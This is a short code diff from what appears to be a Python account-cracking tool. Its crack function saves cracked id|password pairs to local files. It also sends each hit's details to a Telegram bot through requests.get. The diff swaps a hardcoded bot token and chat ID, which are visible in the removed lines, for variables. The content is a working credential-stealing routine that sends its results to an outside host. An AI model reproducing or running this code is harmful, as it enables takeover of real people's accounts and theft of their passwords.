@@ -1262,7 +1262,7 @@ def crack(idf,pwv):
 @R_M_D || @N_9_N_6					
 					'''
 					statuscp1 = nel(statuscp, style='red')
-					requests.get("https://api.telegram.org/bot"+str('6103725322:AAEyXKj-chNyBzIAsGlxVxX1pN_mD_KXWcI')+"/sendMessage?chat_id="+str('647776789')+"&text="+str(statusok))
+					requests.get("https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
 					cetak(nel(statuscp1, title='SESI'))
 					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
@@ -1328,7 +1328,7 @@ def crack(idf,pwv):
 @R_M_D || @N_9_N_6'''
 					infoakun1 = nel(infoakun, style='green')
 					cetak(nel(statusok1, title='OK'))
-					requests.get("https://api.telegram.org/bot"+str('6103725322:AAEyXKj-chNyBzIAsGlxVxX1pN_mD_KXWcI')+"/sendMessage?chat_id="+str('647776789')+"&text="+str(statusok))
+					requests.get("https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
 					
 
 					hit1, hit2 = 0,0
